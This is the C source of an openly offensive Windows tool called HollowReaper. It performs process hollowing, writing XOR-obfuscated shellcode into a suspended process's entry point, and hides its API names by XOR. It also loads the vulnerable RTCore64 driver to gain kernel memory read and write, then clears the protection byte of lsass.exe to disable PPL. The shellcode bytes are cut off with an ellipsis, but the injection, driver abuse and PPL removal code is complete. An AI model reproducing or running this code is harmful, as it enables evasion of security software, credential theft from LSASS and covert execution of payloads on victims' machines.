/*
    Author: vari.sh
    Description:
       - This program implements process hollowing (it creates a suspended process,
         injects a deobfuscated shellcode via XOR, and then resumes the thread).
       - Additionally, it uses new primitives to access memory via the RTCore64 driver,
         and reads the EPROCESS structure of lsass.exe to verify the offsets needed for disabling PPL.
         It then writes the byte that disables PPL.

    Usage: HollowReaper.exe "C:\windows\explorer.exe"

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <tlhelp32.h>


// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

typedef struct _RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
} RTCORE64_MSR_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
#endif

typedef struct _RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
#endif

typedef struct _RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_WRITE;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

static const DWORD RTC64_MSR_READ_CODE = 0x80002030;
static const DWORD RTC64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTC64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Retrieve the Base Address of ntoskrnl.exe via EnumDeviceDrivers
// =====================================================
unsigned long long getKBAddr() {
    DWORD cbNeeded = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
        base = (PVOID*)malloc(cbNeeded);
        if (base) {
            if (EnumDeviceDrivers(base, cbNeeded, &cbNeeded)) {
                unsigned long long addr = (unsigned long long)base[0];
                free(base);
                return addr;
            }
            free(base);
        }
    }
    return 0;
}

// =====================================================
// OS Version Detection and Offsets setting
// =====================================================

// Structure containing the three useful offsets
typedef struct _Offsets {
    DWORD64 ActiveProcessLinks;  // Offset of the ActiveProcessLinks field in _EPROCESS
    DWORD64 ImageFileName;       // Offset of the ImageFileName field in _EPROCESS
    DWORD64 Protection;          // Offset of the Protection (PS_PROTECTION) field in _EPROCESS
} Offsets;


// Function to get the OS version
int GetOSVersion() {
    wchar_t CurrentBuild[255] = { 0 };
    DWORD bufferSize = sizeof(CurrentBuild);
    LONG ret = RegGetValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        L"CurrentBuild",
        RRF_RT_REG_SZ,
        NULL,
        CurrentBuild,
        &bufferSize
    );
    if (ret == ERROR_SUCCESS) {
        wprintf(L"[*] Windows Build %s detected\n", CurrentBuild);
        return _wtoi(CurrentBuild);
    }
    else {
        wprintf(L"[!] Unable to retrieve Windows Build. Error code: %ld\n", ret);
        return -1;
    }
}

// Function to get the offsets
Offsets getOffsets() {
    int build = GetOSVersion();
    if (build < 0) {
        exit(-1);
    }

    Offsets offs = { 0, 0, 0 };

    // Offsets table for x64 (TODO)
    if (build <= 14393) {              // Windows 10 version 1607 (Build 14393)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17134) {       // Windows 10 version 1803 (Build 17134)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17763) {       // Windows 10 version 1809 (Build 17763)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18362) {       // Windows 10 version 1903 (Build 18362)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18363) {       // Windows 10 version 1909 (Build 18363)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 19045) {       // Windows 10 version 22H2 (Build 19041)
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build <= 22631) {  // Windows 23H2
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build > 22631) {  // Windows 11 24H2 and above
        offs.ActiveProcessLinks = 0x1d8;
        offs.ImageFileName = 0x338;
        offs.Protection = 0x5fa;
    }
    else {
        wprintf(L"[!] Offsets not defined for build %d on x64.\n", build);
        exit(1);
    }
    return offs;
}

// =====================================================
// API Deobfuscation Functions (XOR)
// =====================================================

// Function to decrypt a string (encrypted data is not null-terminated)
char* xor_decrypt_string(const unsigned char* cipher, size_t len, const char* key, size_t key_len)
{
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = cipher[i] ^ key[i % key_len];
    }
    result[len] = '\0';
    return result;
}

// Function to decrypt a buffer in-place (e.g., for shellcode)
void xor_decrypt_buffer(unsigned char* buffer, size_t len, const char* key, size_t key_len)
{
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key[i % key_len];
    }
}

// 1. "CreateProcessW" (14 characters)
static const unsigned char CPW_ENC[] = {
    0x73, 0x43, 0x57, 0x52, 0x40, 0x50, 0x66, 0x45, 0x57, 0x5A, 0x04, 0x11, 0x10, 0x33
};
// 2. "ReadProcessMemory" (17 characters)
static const unsigned char RPM_ENC[] = {
    0x62, 0x54, 0x53, 0x57, 0x64, 0x47, 0x59, 0x54, 0x5D, 0x4A, 0x12, 0x2F, 0x06, 0x09, 0x0A, 0x14, 0x1E
};
// 3. "WriteProcessMemory" (18 characters)
static const unsigned char WPM_ENC[] = {
    0x67, 0x43, 0x5B, 0x47, 0x51, 0x65, 0x44, 0x58, 0x5B, 0x5C, 0x12, 0x11, 0x2E, 0x01, 0x08, 0x09, 0x15, 0x11
};
// 4. "ResumeThread" (12 characters)
static const unsigned char RT_ENC[] = {
    0x62, 0x54, 0x41, 0x46, 0x59, 0x50, 0x62, 0x5F, 0x4A, 0x5C, 0x00, 0x06
};
// 5. "ZwQueryInformationProcess" (25 characters)
static const unsigned char ZQIP_ENC[] = {
    0x6A, 0x46, 0x63, 0x46, 0x51, 0x47, 0x4F, 0x7E, 0x56, 0x5F, 0x0E, 0x10, 0x0E, 0x05, 0x11,
    0x0F, 0x08, 0x06, 0x39, 0x18, 0x5F, 0x52, 0x57, 0x40, 0x47
};

typedef BOOL(WINAPI* PFN_CPW)(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef BOOL(WINAPI* PFN_RPM)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    LPVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesRead
    );

typedef BOOL(WINAPI* PFN_WPM)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef DWORD(WINAPI* PFN_RT)(HANDLE hThread);

typedef LONG NTSTATUS;
typedef NTSTATUS(WINAPI* PFN_ZQIP)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

wchar_t* to_wide(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (len == 0) return NULL;
    wchar_t* wstr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wstr, len);
    return wstr;
}

// =====================================================
// Driver loading and unloading
// =====================================================

// Function to load and start the driver
#define DRIVER_NAME "mDriver"
#define DRIVER_PATH "C:\\Windows\\Tasks\\RTCore64.sys"
#define DEVICE_NAME L"\\\\.\\RTCore64"

// Helper function to open the Service Control Manager with the specified access rights
SC_HANDLE OpenSCManagerHandle(DWORD dwAccess) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, dwAccess);
    if (!hSCM) {
        printf("[!] OpenSCManager failed. Error code: %lu\n", GetLastError());
    }
    return hSCM;
}

// Helper function to create or open the driver service
SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, const char* driverPath) {
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        driverName,          // Internal service name
        driverName,          // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,          // Full path to the driver file
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, driverName, SERVICE_ALL_ACCESS);
            if (hService) {
                printf("[+] Existing service opened successfully.\n");
            }
            else {
                printf("[!] Unable to open the existing service. Error code: %lu\n", GetLastError());
            }
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            printf("[!] Service is marked for deletion.\n");
        }
        else {
            printf("[!] CreateService error. Error code: %lu\n", err);
        }
    }
    else {
        printf("[+] Service created successfully.\n");
    }
    return hService;
}

// Function to load and start the driver
int LoadAndStartDriver(void) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = CreateOrOpenDriverService(hSCM, DRIVER_NAME, DRIVER_PATH);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Start the driver service
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[!] StartService error. Error code: %lu\n", err);
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
        else {
            printf("[*] Driver is already loaded.\n");
        }
    }
    else {
        printf("[+] Driver loaded and started successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// Function to stop and unload the driver
int StopAndUnloadDriver(const char* driverName) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = OpenServiceA(hSCM, driverName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            printf("[!] Service does not exist.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            printf("[*] Service is already marked for deletion.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else {
            printf("[!] Error: %s.\n", err);
            CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[!] OpenService failed. Error code: %lu\n", err);
        CloseServiceHandle(hSCM);
        return 1;

    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            printf("[*] The service is not active.\n");
        }
        else {
            printf("[!] ControlService (stop) failed. Error code: %lu\n", err);
        }
    }
    else {
        printf("[+] Service stopped successfully.\n");
    }

    // Attempt to delete the service
    if (!DeleteService(hService)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            printf("[*] Service is already marked for deletion.\n");
        }
        else {
            printf("[!] DeleteService failed. Error code: %lu\n", err);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
    }
    else {
        printf("[+] Service deleted successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void static disablePPL() {

    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        printf("[!] Offset not mapped... exiting!\n");
        exit(1);
    }

    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (Device == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to obtain a handle to the device object\n");
        return;
    }
    printf("[*] Device handle obtained\n");

    unsigned long long ntoskrnlBase = getKBAddr();
    printf("[*] ntoskrnl.exe base address: 0x%llx\n", ntoskrnlBase);

    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNtoskrnl) {
        printf("[!] Failed to load ntoskrnl.exe\n");
        CloseHandle(Device);
        return;
    }
    // Calculate the offset of the exported variable PsInitialSystemProcess
    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    FreeLibrary(hNtoskrnl);

    // Retrieve the address of the System process's EPROCESS
    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
    printf("[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx\n", SystemProcessEPROCESS);

    // Calculate the list head (located within the EPROCESS)
    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list

    while (CurrentEntry != ListHead) {
        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;

        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
        char imageName[16] = { 0 };
        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
        imageName[15] = '\0';

        if (_stricmp(imageName, "lsass.exe") == 0) {
            printf("[*] Found EPROCESS at 0x%llx\n", eprocess);
            // Read the protection byte (PPL) from the EPROCESS
            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            printf("[*] Protection value: 0x%02X\n", protection);

            // To disable PPL, write 0x00 into this field.
            // Warning: perform this operation only if you are sure the offsets are correct.
            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
            printf("[+] PPL disabled (0x00 written)\n");

            // Read the protection byte (PPL) from the EPROCESS again
            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            printf("[*] Protection value after write: 0x%02X\n", protection_post);

            break;
        }
        // Move to the next element in the list
        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
    }

    CloseHandle(Device);
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        printf("[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        printf("[!] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// Main – Process Hollowing + LSASS EPROCESS Reading
// =====================================================
int main(int argc, char* argv[]) {
    // Start
    printf("[+] Starting HollowReaper\n");

    // Enabling SeDebugPrivilege
    HANDLE hToken = NULL;
    LUID luid;
    TOKEN_PRIVILEGES tp;
    BOOL bResult;

    printf("[*] Requesting SeDebugPrivilege...\n");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
        printf("[!] LookupPrivilegeValue failed, error: %lu\n", GetLastError());
        return 1;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges->Attributes = SE_PRIVILEGE_ENABLED;
    tp.Privileges->Luid = luid;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed, error: %lu\n", GetLastError());
        return 1;
    }
    if (GetLastError() != ERROR_SUCCESS) {
        printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled.\n");

    // Load clean versions of DLLs
    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
    HANDLE hKernel32 = LoadCleanDLL(kernel32Path);

    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hNtdll = LoadCleanDLL(ntdllPath);
    
    const char* XOR_KEY = "0123456789abcdefghij";
    size_t key_len = strlen(XOR_KEY);

    char* strCPW = (char*)malloc(sizeof(CPW_ENC));
    char* strRPM = (char*)malloc(sizeof(RPM_ENC));
    char* strWPM = (char*)malloc(sizeof(WPM_ENC));
    char* strRT = (char*)malloc(sizeof(RT_ENC));
    char* strZQIP = (char*)malloc(sizeof(ZQIP_ENC));
    if (!strCPW || !strRPM || !strWPM || !strRT || !strZQIP) {
        printf("[!] Memory allocation error\n");
        return 1;
    }
    memcpy(strCPW, CPW_ENC, sizeof(CPW_ENC));
    memcpy(strRPM, RPM_ENC, sizeof(RPM_ENC));
    memcpy(strWPM, WPM_ENC, sizeof(WPM_ENC));
    memcpy(strRT, RT_ENC, sizeof(RT_ENC));
    memcpy(strZQIP, ZQIP_ENC, sizeof(ZQIP_ENC));
    // Deobfuscate API names
    strCPW = xor_decrypt_string((unsigned char*)strCPW, sizeof(CPW_ENC), XOR_KEY, key_len);
    strRPM = xor_decrypt_string((unsigned char*)strRPM, sizeof(RPM_ENC), XOR_KEY, key_len);
    strWPM = xor_decrypt_string((unsigned char*)strWPM, sizeof(WPM_ENC), XOR_KEY, key_len);
    strRT = xor_decrypt_string((unsigned char*)strRT, sizeof(RT_ENC), XOR_KEY, key_len);
    strZQIP = xor_decrypt_string((unsigned char*)strZQIP, sizeof(ZQIP_ENC), XOR_KEY, key_len);

    PFN_CPW pCPW = (PFN_CPW)GetProcAddress(hKernel32, strCPW);
    PFN_RPM pRPM = (PFN_RPM)GetProcAddress(hKernel32, strRPM);
    PFN_WPM pWPM = (PFN_WPM)GetProcAddress(hKernel32, strWPM);
    PFN_RT  pRT = (PFN_RT)GetProcAddress(hKernel32, strRT);
    PFN_ZQIP pZQIP = (PFN_ZQIP)GetProcAddress(hNtdll, strZQIP);
    if (!pCPW || !pRPM || !pWPM || !pRT || !pZQIP) {
        printf("[!] Error retrieving API addresses.\n");
        return 1;
    }
    free(strCPW); free(strRPM); free(strWPM); free(strRT); free(strZQIP);

    // Obtain the target executable path (from command line or stdin)
    char exePathA[MAX_PATH] = { 0 };
    if (argc > 1) {
        strncpy(exePathA, argv[1], MAX_PATH - 1);
        printf("[+] Path provided from command line: %s\n", exePathA);
    }
    else {
        printf("[*] Enter the full path of the executable: ");
        if (!fgets(exePathA, sizeof(exePathA), stdin)) {
            printf("[!] Error reading the path.\n");
            return 1;
        }
        exePathA[strcspn(exePathA, "\r\n")] = '\0';
    }
    if (strlen(exePathA) == 0) {
        printf("[!] Invalid path!\n");
        return 1;
    }
    wchar_t* exePathW = to_wide(exePathA);
    if (!exePathW) {
        printf("[!] Error converting the path to Unicode.\n");
        return 1;
    }

    // Create the process in a suspended state
    
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!pCPW(exePathW, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[!] Error creating the process, code: %lu\n", GetLastError());
        free(exePathW);
        return 1;
    }
    free(exePathW);
    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
    


    // Retrieve the PEB via ZwQueryInformationProcess
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID ExitStatus;
        PVOID PebBaseAddress;
        PVOID AffinityMask;
        PVOID BasePriority;
        ULONG_PTR UniqueProcessId;
        PVOID InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;
    NTSTATUS ntStatus = pZQIP(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);
    if (ntStatus != 0) {
        printf("[!] ZwQueryInformationProcess failed, NTSTATUS: 0x%lX\n", ntStatus);
        return 1;
    }
    printf("[*] The process's PEB is located at: %p\n", pbi.PebBaseAddress);

    // Read the ImageBaseAddress from the PEB
    LPVOID imageBaseAddress = NULL;
    SIZE_T bytesRead = 0;
    LPCVOID addrImageBase = (LPCVOID)((char*)pbi.PebBaseAddress + 0x10);
    if (!pRPM(pi.hProcess, addrImageBase, &imageBaseAddress, sizeof(imageBaseAddress), &bytesRead)) {
        printf("[!] ReadProcessMemory (ImageBaseAddress) failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] The Image Base Address is: %p\n", imageBaseAddress);

    // Read the PE header to obtain the EntryPoint
    unsigned char headerBuffer[0x200] = { 0 };
    if (!pRPM(pi.hProcess, imageBaseAddress, headerBuffer, sizeof(headerBuffer), &bytesRead)) {
        printf("[!] ReadProcessMemory (PE header) failed, error: %lu\n", GetLastError());
        return 1;
    }
    DWORD e_lfanew = *(DWORD*)(headerBuffer + 0x3C);
    DWORD entryPointRVA = *(DWORD*)(headerBuffer + e_lfanew + 0x28);
    LPVOID entryPointAddr = (LPVOID)((char*)imageBaseAddress + entryPointRVA);
    printf("[*] The process EntryPoint is: %p\n", entryPointAddr);

    // Prepare and write the shellcode (deobfuscated via XOR) into the EntryPoint
    unsigned char shellcode_enc[] = {
        0xD8, 0xF1, 0x67, 0x33, ...
    };
    size_t shellcode_len = sizeof(shellcode_enc);
    // Deobfuscate the shellcode
    xor_decrypt_buffer(shellcode_enc, shellcode_len, XOR_KEY, key_len);
    SIZE_T bytesWritten = 0;
    if (!pWPM(pi.hProcess, entryPointAddr, shellcode_enc, shellcode_len, &bytesWritten)) {
        printf("[!] WriteProcessMemory failed, error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Shellcode written at the EntryPoint.\n");

    // Start the driver
    LoadAndStartDriver();

    // Disable PPL
    disablePPL();

    // Resume the suspended process thread
    DWORD suspendCount = pRT(pi.hThread);
    printf("[+] Thread resumed, suspend count: %lu\n", suspendCount);

    // Unload the driver
    StopAndUnloadDriver(DRIVER_NAME);

    // Cleanup: close handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[+] Operation completed.\n");
    return 0;
}
